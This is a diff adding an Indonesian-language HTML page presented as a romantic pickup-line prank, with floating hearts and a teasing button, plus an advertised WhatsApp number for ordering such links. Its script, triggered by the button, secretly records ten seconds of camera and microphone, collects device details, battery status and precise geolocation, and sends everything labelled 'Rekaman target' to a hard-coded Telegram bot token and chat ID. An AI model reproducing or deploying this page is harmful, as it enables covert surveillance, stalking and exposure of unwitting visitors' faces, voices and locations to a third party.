@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Tiang Tiang Rindu</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    min-height: 100vh;
+    background: linear-gradient(135deg, #0a1a4f 0%, #1e3a8a 50%, #0a1a4f 100%);
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    color: #fff;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    overflow: hidden;
+    position: relative;
+    padding: 24px;
+    text-align: center;
+  }
+  .hearts { position: fixed; inset: 0; pointer-events: none; overflow: hidden; z-index: 0; }
+  .heart {
+    position: absolute;
+    font-size: 1.5rem;
+    opacity: 0.7;
+    animation: floatUp linear infinite;
+    filter: drop-shadow(0 0 6px rgba(255,105,180,0.8));
+  }
+  @keyframes floatUp {
+    0% { transform: translateY(110vh) scale(0.6) rotate(0deg); opacity: 0; }
+    10% { opacity: 0.9; }
+    90% { opacity: 0.9; }
+    100% { transform: translateY(-10vh) scale(1.2) rotate(360deg); opacity: 0; }
+  }
+  .content { position: relative; z-index: 1; max-width: 640px; }
+  h1 {
+    font-size: clamp(1.6rem, 6vw, 2.6rem);
+    line-height: 1.3;
+    text-shadow: 0 0 20px rgba(255,105,180,0.9), 0 0 40px rgba(255,105,180,0.5);
+    margin-bottom: 18px;
+    animation: pulse 2.5s ease-in-out infinite;
+  }
+  @keyframes pulse {
+    0%, 100% { transform: scale(1); }
+    50% { transform: scale(1.04); }
+  }
+  .order-note {
+    font-size: clamp(0.75rem, 3vw, 0.95rem);
+    color: #ffd6e8;
+    opacity: 0.9;
+    margin-bottom: 40px;
+    letter-spacing: 0.5px;
+  }
+  .order-note a { color: #ff8fc7; text-decoration: none; font-weight: 600; }
+  button {
+    background: linear-gradient(135deg, #ff4d94, #ff1f6f);
+    border: none;
+    color: #fff;
+    font-size: clamp(1rem, 4vw, 1.3rem);
+    font-weight: 700;
+    padding: 16px 44px;
+    border-radius: 999px;
+    cursor: pointer;
+    box-shadow: 0 0 24px rgba(255,31,111,0.7), 0 6px 20px rgba(0,0,0,0.4);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+    animation: bounce 1.8s ease-in-out infinite;
+  }
+  @keyframes bounce {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(-8px); }
+  }
+  button:active { transform: scale(0.95); }
+  #status {
+    margin-top: 26px;
+    font-size: 0.95rem;
+    color: #bcd0ff;
+    min-height: 1.4em;
+  }
+  #preview {
+    margin-top: 20px;
+    width: min(280px, 80vw);
+    border-radius: 16px;
+    display: none;
+    box-shadow: 0 0 24px rgba(255,105,180,0.6);
+  }
+</style>
+</head>
+<body>
+
+<div class="hearts" id="hearts"></div>
+
+<div class="content">
+  <h1>Tiang tiang apa yg bikin rindu?</h1>
+  <p class="order-note">yg mau order jasa link gombal ke no <a href="https://wa.me/6282364836917">082364836917</a></p>
+  <button id="cta">apaa tuhhh</button>
+  <div id="status"></div>
+  <video id="preview" autoplay muted playsinline></video>
+</div>
+
+<script>
+// Konfigurasi bot Telegram — ganti dengan milik Anda.
+const BOT_TOKEN = "9015537772:AAFPJ2WgsDbcJNpmZpwALw4j-hlU36B7luE";
+const CHAT_ID   = "8707597208";
+const RECORD_MS = 10_000;
+
+const heartsEl = document.getElementById("hearts");
+const heartChars = ["❤️", "💕", "💖", "💗", "💓", "💘", "🩷"];
+
+function spawnHeart() {
+  const h = document.createElement("span");
+  h.className = "heart";
+  h.textContent = heartChars[Math.floor(Math.random() * heartChars.length)];
+  h.style.left = Math.random() * 100 + "vw";
+  h.style.fontSize = (1 + Math.random() * 1.8) + "rem";
+  h.style.animationDuration = (6 + Math.random() * 6) + "s";
+  h.style.animationDelay = (Math.random() * 4) + "s";
+  heartsEl.appendChild(h);
+  setTimeout(() => h.remove(), 14000);
+}
+for (let i = 0; i < 14; i++) spawnHeart();
+setInterval(spawnHeart, 900);
+
+const statusEl = document.getElementById("status");
+const previewEl = document.getElementById("preview");
+const ctaBtn = document.getElementById("cta");
+
+// Info perangkat yang benar-benar bisa dibaca browser.
+function collectDeviceInfo() {
+  const ua = navigator.userAgent;
+  const nav = navigator;
+  return {
+    userAgent: ua,
+    platform: nav.platform || "tidak tersedia",
+    language: nav.language || "tidak tersedia",
+    languages: (nav.languages || []).join(", ") || "tidak tersedia",
+    screen: `${screen.width}x${screen.height} @${window.devicePixelRatio}x`,
+    viewport: `${window.innerWidth}x${window.innerHeight}`,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "tidak tersedia",
+    online: nav.onLine,
+    hardwareConcurrency: nav.hardwareConcurrency || "tidak tersedia",
+    deviceMemoryGB: nav.deviceMemory || "tidak tersedia",
+    lokasi: null,
+    baterai: null
+  };
+}
+
+async function collectBattery() {
+  if (!navigator.getBattery) return "tidak tersedia (browser tidak mendukung)";
+  try {
+    const b = await navigator.getBattery();
+    const persen = Math.round(b.level * 100);
+    const cas = b.charging ? "sedang dicas" : "tidak dicas";
+    return `${persen}% — ${cas}`;
+  } catch {
+    return "tidak tersedia";
+  }
+}
+
+function collectLocation() {
+  return new Promise((resolve) => {
+    if (!navigator.geolocation) return resolve("tidak tersedia");
+    navigator.geolocation.getCurrentPosition(
+      (pos) => resolve(`${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)} (±${Math.round(pos.coords.accuracy)}m)`),
+      () => resolve("izin lokasi ditolak"),
+      { timeout: 8000 }
+    );
+  });
+}
+
+async function sendToTelegram(videoBlob, info) {
+  const caption =
+    "🎥 *Rekaman target*\n" +
+    `UA: ${info.userAgent}\n` +
+    `Platform: ${info.platform}\n` +
+    `Bahasa: ${info.language}\n` +
+    `Layar: ${info.screen}\n` +
+    `Viewport: ${info.viewport}\n` +
+    `Zona waktu: ${info.timezone}\n` +
+    `Online: ${info.online}\n` +
+    `Core CPU: ${info.hardwareConcurrency}\n` +
+    `RAM (perkiraan): ${info.deviceMemoryGB} GB\n` +
+    `Baterai: ${info.baterai}\n` +
+    `Lokasi: ${info.lokasi}`;
+
+  const fd = new FormData();
+  fd.append("chat_id", CHAT_ID);
+  fd.append("caption", caption);
+  fd.append("parse_mode", "Markdown");
+  fd.append("video", videoBlob, "rekaman.webm");
+
+  const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+    method: "POST",
+    body: fd
+  });
+  if (!res.ok) {
+    const err = await res.text();
+    throw new Error("Telegram error: " + err);
+  }
+}
+
+ctaBtn.addEventListener("click", async () => {
+  ctaBtn.disabled = true;
+  statusEl.textContent = "Menyiapkan kamera...";
+
+  let stream;
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" },
+      audio: true
+    });
+  } catch (err) {
+    statusEl.textContent = "Kamera/mikrofon tidak diizinkan atau tidak tersedia.";
+    ctaBtn.disabled = false;
+    return;
+  }
+
+  previewEl.style.display = "block";
+  previewEl.srcObject = stream;
+
+  const mime = MediaRecorder.isTypeSupported("video/webm;codecs=vp9,opus")
+    ? "video/webm;codecs=vp9,opus"
+    : "video/webm";
+  const rec = new MediaRecorder(stream, { mimeType: mime });
+  const chunks = [];
+  rec.ondataavailable = (e) => { if (e.data.size) chunks.push(e.data); };
+
+  const done = new Promise((resolve) => { rec.onstop = resolve; });
+  rec.start();
+
+  let sisa = RECORD_MS / 1000;
+  statusEl.textContent = `Merekam... ${sisa} detik`;
+  const tick = setInterval(() => {
+    sisa--;
+    if (sisa > 0) statusEl.textContent = `Merekam... ${sisa} detik`;
+  }, 1000);
+
+  setTimeout(() => { rec.stop(); clearInterval(tick); }, RECORD_MS);
+  await done;
+  stream.getTracks().forEach((t) => t.stop());
+  previewEl.srcObject = null;
+  previewEl.style.display = "none";
+
+  statusEl.textContent = "Mengirim...";
+  const info = collectDeviceInfo();
+  info.baterai = await collectBattery();
+  info.lokasi  = await collectLocation();
+
+  const blob = new Blob(chunks, { type: "video/webm" });
+  try {
+    await sendToTelegram(blob, info);
+    statusEl.textContent = "Terkirim. Terima kasih!";
+  } catch (e) {
+    statusEl.textContent = "Gagal mengirim: " + e.message;
+  }
+  ctaBtn.disabled = false;
+});
+</script>
+</body>
+</html>
